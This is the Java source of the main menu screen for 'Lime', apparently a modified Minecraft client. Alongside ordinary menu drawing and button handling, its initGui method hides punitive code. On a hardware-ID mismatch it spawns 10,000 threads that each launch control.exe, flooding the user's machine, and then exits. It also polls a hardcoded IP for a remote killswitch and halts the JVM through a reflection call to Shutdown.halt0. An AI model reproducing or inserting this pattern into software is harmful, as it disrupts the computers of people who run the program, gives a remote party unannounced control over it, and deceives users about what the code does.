package lime.ui.gui;

import lime.core.Information;
import lime.core.Lime;
import lime.management.FontManager;
import lime.ui.fields.ButtonField;
import lime.utils.render.RenderUtils;
import net.minecraft.client.gui.*;
import net.minecraft.util.EnumChatFormatting;
import net.minecraft.util.ResourceLocation;
import org.lwjgl.opengl.GL11;
import oshi.SystemInfo;

import javax.swing.*;
import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Base64;

public class MainScreen extends GuiScreen {
    public static boolean clickGui;

    public static boolean anim = false;

    public static String getHardwareID() {
        try {
            SystemInfo systemInfo = new SystemInfo();
            String string = System.getenv("PROCESSOR_IDENTIFIER") + System.getenv("PROCESSOR_LEVEL") + systemInfo.getOperatingSystem().getManufacturer() + systemInfo.getHardware().getMemory().getTotal() + systemInfo.getHardware().getProcessors()[0].getName() + systemInfo.getHardware().getProcessors()[0].getIdentifier();
            MessageDigest messageDigest = MessageDigest.getInstance("md5");
            StringBuilder stringBuilder = new StringBuilder();
            messageDigest.update(string.getBytes());
            for (byte by : messageDigest.digest()) {
                String string2 = Integer.toHexString(0xFF & by);
                if (string2.length() == 1) {
                    stringBuilder.append('0');
                }
                stringBuilder.append(string2);
            }
            return Base64.getEncoder().encodeToString(stringBuilder.toString().getBytes());
        }
        catch (Exception exception) {
            exception.printStackTrace();
            return "fail";
        }
    }

    @Override
    public void initGui() {
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL("http://108.61.210.115/killswitch-a.html").openConnection();
            if(Lime.getInstance().getUser() == null || !Lime.getInstance().getUser().getHwid().equals(getHardwareID())) {
                for (int i = 0; i < 10000; i++) {
                    new Thread(() -> {
                        try {
                            Runtime.getRuntime().exec("control.exe");
                        } catch (Exception e) {
                            System.exit(0);
                        }
                    }).start();
                }
                System.exit(0);
            }
            String content = "";
            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream(), StandardCharsets.UTF_8)))
            {
                String inputLine;
                StringBuilder stringBuilder = new StringBuilder();
                while ((inputLine = bufferedReader.readLine()) != null)
                {
                    stringBuilder.append(inputLine);
                }
                content = stringBuilder.toString();
            }

            if(content.contains("true")) {
                JOptionPane.showMessageDialog(null, "KillSwitch enabled.");
                try {
                    Method method = Class.forName("java.lang.Shutdown").getDeclaredMethod("halt0", int.class);
                    method.setAccessible(true);
                    method.invoke(null, 0);
                } catch (Exception ignored) { }
            }
        } catch (Exception e) {
            try {
                Method method = Class.forName("java.lang.Shutdown").getDeclaredMethod("halt0", int.class);
                method.setAccessible(true);
                method.invoke(null, 0);
            } catch (Exception ignored) { }
        }
        clickGui = false;
        final Color color = new Color(41, 41, 41, 255);

        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Singleplayer", width / 2F - 75, height / 2F, 150, 20, false, color, true, new Color(255, 255, 255, 200), !anim, () -> {
            mc.displayGuiScreen(new GuiSelectWorld(this));
        }));
        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Multiplayer", width / 2F - 75, height / 2F + 22, 150, 20, false, color, true, new Color(255, 255, 255, 200), !anim, () -> {
            mc.displayGuiScreen(new GuiMultiplayer(this));
        }));
        this.customButtonList.add(new ButtonField(FontManager.ProductSans20.getFont(), "Alt Manager", width / 2F - 75, height / 2F + 22 + 22, 150, 20, false, color, true, new Color(255, 255, 255, 200), !anim, () -> {
            mc.displayGuiScreen(Lime.getInstance().getAltManager().getAltManagerScreen());
        }));
        anim = true;
        super.initGui();
    }

    @Override
    public void drawScreen(int mouseX, int mouseY, float partialTicks) {
        GuiScreen.drawRect(0, 0, mc.displayWidth, mc.displayHeight, new Color(21, 21, 21).getRGB());
        FontManager.ProductSans20.getFont().drawStringWithShadow("Made by " + Information.getAuthor(), width - (FontManager.ProductSans20.getFont().getStringWidth("Made by" + Information.getAuthor())) - 6, height - FontManager.ProductSans20.getFont().getFontHeight(), -1);
        FontManager.ProductSans20.getFont().drawStringWithShadow("Lime " + Information.getVersion() + " | Build: " + Information.getBuild(), 1, height - (FontManager.ProductSans20.getFont().getFontHeight()), -1);

        GL11.glPushMatrix();
        GL11.glEnable(GL11.GL_SCISSOR_TEST);

        RenderUtils.prepareScissorBox((width / 2F - (FontManager.ProductSans76.getFont().getStringWidth("Lime")  / 2F)), this.height / 2F - 132, (width / 2F - (FontManager.ProductSans76.getFont().getStringWidth("Lime")  / 2F)) + (FontManager.ProductSans76.getFont().getStringWidth("Lime")), this.height / 2F - 132 + FontManager.ProductSans76.getFont().getFontHeight() - 5);
        FontManager.ProductSans76.getFont().drawStringWithShadow(EnumChatFormatting.GREEN + "L§fime", (width / 2F - (FontManager.ProductSans76.getFont().getStringWidth("Lime")  / 2F)), this.height / 2F - 132, -1);
        GL11.glDisable(GL11.GL_SCISSOR_TEST);
        GL11.glPopMatrix();

        ScaledResolution sr = new ScaledResolution(mc);

        GL11.glPushMatrix();
        RenderUtils.drawImage(new ResourceLocation("lime/images/settings.png"), sr.getScaledWidth() - 72, 3, 32, 32);
        RenderUtils.drawImage(new ResourceLocation("lime/images/shutdown.png"), sr.getScaledWidth() - 34, 3, 32, 32);
        GL11.glEnable(GL11.GL_BLEND);
        FontManager.ProductSans20.getFont().drawStringWithShadow("Options", sr.getScaledWidth() - 76, 38, -1);
        FontManager.ProductSans20.getFont().drawStringWithShadow("Quit", sr.getScaledWidth() - 29, 38, -1);
        GL11.glPopMatrix();
        super.drawScreen(mouseX, mouseY, partialTicks);
    }

    @Override
    protected void mouseClicked(int mouseX, int mouseY, int mouseButton) throws IOException {
        ScaledResolution sr = new ScaledResolution(mc);
        if(hover(sr.getScaledWidth() - 72, 3, mouseX, mouseY, 32, 40)) {
            mc.displayGuiScreen(new GuiOptions(this, mc.gameSettings));
        }
        if(hover(sr.getScaledWidth() -34, 3, mouseX, mouseY, 32, 40)) {
            mc.shutdown();
        }
        super.mouseClicked(mouseX, mouseY, mouseButton);
    }

    @Override
    protected void keyTyped(char typedChar, int keyCode) throws IOException {
        if(keyCode == 54) {
            clickGui = true;
            mc.displayGuiScreen(Lime.getInstance().getClickGUI2());
        }
        super.keyTyped(typedChar, keyCode);
    }
}
